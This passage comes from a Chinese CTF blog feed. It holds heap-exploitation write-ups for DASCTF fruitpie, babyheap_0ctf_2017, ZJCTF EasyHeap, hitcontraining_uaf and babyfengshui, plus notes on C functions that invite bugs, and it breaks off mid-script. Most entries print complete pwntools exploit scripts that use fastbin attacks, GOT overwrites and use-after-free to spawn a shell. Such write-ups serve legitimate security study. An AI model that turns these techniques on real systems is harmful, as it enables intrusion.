x来调整栈帧，x的取值可以有2，4，6，8，9。</li></ul><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">context.arch=<span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;183.129.189.60&#x27;</span>,<span class="number">10018</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./fruitpie&quot;)</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Enter the size to malloc:&#x27;</span>,<span class="string">&#x27;99999999&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line"></span><br><span class="line">addr = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(addr)</span><br><span class="line"></span><br><span class="line">libc_base = addr + <span class="number">0x5f5eff0</span></span><br><span class="line"></span><br><span class="line">one = [<span class="number">0x4f365</span>,<span class="number">0x4f3c2</span>,<span class="number">0x10a45c</span>]</span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">realloc_hook = malloc_hook - <span class="number">0x8</span></span><br><span class="line"></span><br><span class="line">realloc = libc_base + libc.symbols[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line"></span><br><span class="line">one_gadget = libc_base + one[<span class="number">1</span>] <span class="comment">#0x4f3c2</span></span><br><span class="line"></span><br><span class="line">offset = realloc_hook - addr</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(realloc_hook)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Offset:&#x27;</span>,<span class="built_in">hex</span>(offset))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Data:&#x27;</span>,p64(one_gadget) + p64(realloc+<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;DASCTF 2021三月赛&lt;/p&gt;</summary>
    
    
    
    <category term="比赛WriteUp" scheme="https://trick.ink/categories/%E6%AF%94%E8%B5%9BWriteUp/"/>
    
    
  </entry>
  
  <entry>
    <title>C语言中常见漏洞点</title>
    <link href="https://trick.ink/article/C/"/>
    <id>https://trick.ink/article/C/</id>
    <published>2021-09-28T19:45:18.544Z</published>
    <updated>2021-07-24T06:37:24.412Z</updated>
    
    <content type="html"><![CDATA[<h1 id="记录常见漏洞点"><a href="#记录常见漏洞点" class="headerlink" title="记录常见漏洞点"></a>记录常见漏洞点</h1><span id="more"></span><h1 id="C语言函数"><a href="#C语言函数" class="headerlink" title="C语言函数"></a>C语言函数</h1><h2 id="strlen"><a href="#strlen" class="headerlink" title="strlen"></a>strlen</h2><p>计算 ascii 字符串长度的函数</p><p>这个函数在计算字符串长度时是不把结束符 <code>&#39;\x00&#39;</code> 计算在内的</p><h2 id="strcpy"><a href="#strcpy" class="headerlink" title="strcpy"></a>strcpy</h2><p>在复制字符串时会拷贝结束符 <code>&#39;\x00&#39;</code>，能造成 NULL byte off-by-one </p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;记录常见漏洞点&quot;&gt;&lt;a href=&quot;#记录常见漏洞点&quot; class=&quot;headerlink&quot; title=&quot;记录常见漏洞点&quot;&gt;&lt;/a&gt;记录常见漏洞点&lt;/h1&gt;</summary>
    
    
    
    <category term="笔记" scheme="https://trick.ink/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>BUU_Heap</title>
    <link href="https://trick.ink/article/BUU_Heap/"/>
    <id>https://trick.ink/article/BUU_Heap/</id>
    <published>2021-09-28T19:45:18.464Z</published>
    <updated>2021-07-24T06:37:55.423Z</updated>
    
    <content type="html"><![CDATA[<h1 id="BUU-Heap"><a href="#BUU-Heap" class="headerlink" title="BUU_Heap"></a>BUU_Heap</h1><span id="more"></span><h1 id="heap-babyheap-0ctf-2017"><a href="#heap-babyheap-0ctf-2017" class="headerlink" title="heap babyheap_0ctf_2017"></a>heap babyheap_0ctf_2017</h1><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./babyheap_0ctf_2017&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;node3.buuoj.cn&#x27;,27300)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Command: &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Command: &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(index))   </span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(content))) </span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Content: &#x27;</span>,content)  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Command: &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Command: &#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">fill(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">5</span>+p64(<span class="number">0x31</span>)+p64(<span class="number">0</span>)*<span class="number">5</span>+p64(<span class="number">0x31</span>)+p8(<span class="number">0xc0</span>))</span><br><span class="line">fill(<span class="number">3</span>,p64(<span class="number">0</span>)*<span class="number">5</span>+p64(<span class="number">0x31</span>))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">fill(<span class="number">3</span>,p64(<span class="number">0</span>)*<span class="number">5</span> + p64(<span class="number">0x111</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">dump(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line">get_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">libc_base=u64(p.recv(<span class="number">8</span>)) - (<span class="number">0x3c4b20</span> + <span class="number">0x58</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base=======&gt;&gt;&#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">malloc_addr = libc_base + <span class="number">0x3c4b10</span></span><br><span class="line"></span><br><span class="line">fill(<span class="number">2</span>,p64(malloc_addr - <span class="number">0x23</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">fill(<span class="number">6</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">3</span>+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(libc_base+<span class="number">0x4526a</span>))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">0x20</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="ZJCTF-2019-EasyHeap"><a href="#ZJCTF-2019-EasyHeap" class="headerlink" title="[ZJCTF 2019]EasyHeap"></a>[ZJCTF 2019]EasyHeap</h1><h2 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h2><p><img src="/article/BUU_Heap/image-20210413141119979.png" alt="image-20210413141119979"></p><p>地址随机化没有打开，Partial RELRO 那说明got表可写，可以通过改写got表为想要的函数</p><h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><p>三个主要的函数，create，edit，delete</p><ul><li><p>create ：</p><p><img src="/article/BUU_Heap/image-20210413142054405.png" alt="image-20210413142054405"></p><p>用 heaparray 数组管理堆块指针。。。。可以利用</p></li><li><p>edit ：有堆溢出</p></li><li><p>del 函数 free之后数据会清0，没有uaf漏洞</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v5 == <span class="number">4869</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)magic &lt;= <span class="number">0x1305</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v4 = <span class="string">&quot;So sad !&quot;</span>;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;So sad !&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v4 = <span class="string">&quot;Congrt !&quot;</span>;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Congrt !&quot;</span>);</span><br><span class="line">          l33t();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">l33t</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;cat /home/pwn/flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当在menu中输入4869时，会判断 magic 的值是否大于等于 0x1305， magic 在bss段上，可以通过unsorted bin attack修改 magic 为一个很大的值。</p><p>很简单，但却是个坑</p><p>exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h2 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a>解题思路：</h2><ul><li>利用 fastbin attack</li><li>找到程序中管理堆块指针的数组 heaparray 改为 free_got</li><li>修改 free_got 的指针指向 system 的地址</li><li>当一个数据为 ‘/bin/sh’ 的堆去 free 时 -&gt; free(‘/bin/sh’) -&gt; system(‘/bin/sh’)</li></ul><p>找到 heaparray 上方可以造 fake fastbin 的位置，算出offset</p><p><img src="/article/BUU_Heap/image-20210413143453006.png" alt="image-20210413143453006"></p><h2 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./easyheap&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;node3.buuoj.cn&#x27;,28495)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./easyheap&#x27;</span>)</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"><span class="comment">#magic_addr =  0x6020C0</span></span><br><span class="line">heaparray_addr = <span class="number">0x6020e0</span></span><br><span class="line">find_fake_fast = <span class="number">0x6020ad</span></span><br><span class="line">system_addr = <span class="number">0x400C2C</span></span><br><span class="line">offset = <span class="number">0x33</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Size of Heap : &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Content of heap:&#x27;</span>,<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index))   </span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Size of Heap : &#x27;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(content))) </span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Content of heap : &#x27;</span>,content)  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#0 </span></span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x71</span>) + p64(find_fake_fast))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(offset-<span class="number">0x10</span>) + p64(free_got)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#fake 4</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, p64(system_addr))</span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="hitcontraining-uaf"><a href="#hitcontraining-uaf" class="headerlink" title="hitcontraining_uaf"></a>hitcontraining_uaf</h1><h2 id="保护-1"><a href="#保护-1" class="headerlink" title="保护"></a>保护</h2><p><img src="/article/BUU_Heap/image-20210413194353222.png" alt="image-20210413194353222"></p><p>del函数中free没有清零，经典uaf。</p><p><img src="/article/BUU_Heap/image-20210413201741472.png" alt="image-20210413201741472"></p><p>并且程序有getshell</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">magic</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="exp：-1"><a href="#exp：-1" class="headerlink" title="exp："></a>exp：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./hacknote&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29405</span>)</span><br><span class="line"></span><br><span class="line">magic_addr =  <span class="number">0x8048945</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Note size :&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Content :&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment"># heap 0</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;b&#x27;</span>)<span class="comment"># heap 1 </span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>,p32(magic_addr))</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="babyfengshui-33c3-2016"><a href="#babyfengshui-33c3-2016" class="headerlink" title="babyfengshui_33c3_2016"></a>babyfengshui_33c3_2016</h1><h2 id="保护-2"><a href="#保护-2" class="headerlink" title="保护"></a>保护</h2><p><img src="/article/BUU_Heap/image-20210415201237083.png" alt="image-20210415201237083"></p><h2 id="IDA-1"><a href="#IDA-1" class="headerlink" title="IDA"></a>IDA</h2><p>3个主要功能</p><ul><li>add</li></ul><p><img src="/article/BUU_Heap/image-20210415212312902.png" alt="image-20210415212312902"></p><p>我们申请的chunk用来存放 description（text）的数据，系统默认再申请一个0x80大小的chunk来存放 name ，并且把 description 的地址放到了 name 的数据中。<br>比如我们申请一个0x80的 chunk</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;name1&#x27;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span>)</span><br></pre></td></tr></table></figure><p><img src="/article/BUU_Heap/image-20210415203230331.png" alt="image-20210415203230331"></p><p>修改 -&gt; 泄露 -&gt; libcbase</p><ul><li>update</li></ul><p><img src="/article/BUU_Heap/image-20210415212252793.png" alt="image-20210415212252793"></p><p>add函数之后会进入updata函数，这里限制了输入的长度，对于chunk0来说，就是0x80c008+输入长度是否大于0x804c08c，但是，有一个问题就是，chunk0和chunk0(name)其实不一定是相邻的，这样的话就有了实现溢出的可能。</p><ul><li><p>free</p><p>会清零数据，无法利用</p></li></ul><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><ul><li>先申请几个小的chunk，然后释放第1个chunk，再申请一个大的chunk，让大chunk的 description 数据域在最前面， name 数据域在所有chunk的后面，通过 edit 来堆溢出</li><li>通过堆溢出修改第2个 chunk 中指向自己 name 数据域的指针指向 free_got ，再 Display 即可泄露出 free 地址，算出libcbase</li><li>直接修改第2个 chunk 指向自己 name 数据域的指针指向 system ，再执行 free 函数时：free(‘/bin/sh’) -&gt; system(‘/bin/sh’)</li></ul><h2 id="exp：-2"><a href="#exp：-2" class="headerlink" title="exp："></a>exp：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.arch = &#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./babyfengshui_33c3_2016&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28333</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./babyfengshui_33c3_2016&#x27;</span>)</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,name,text</span>):</span></span><br><span class="line">    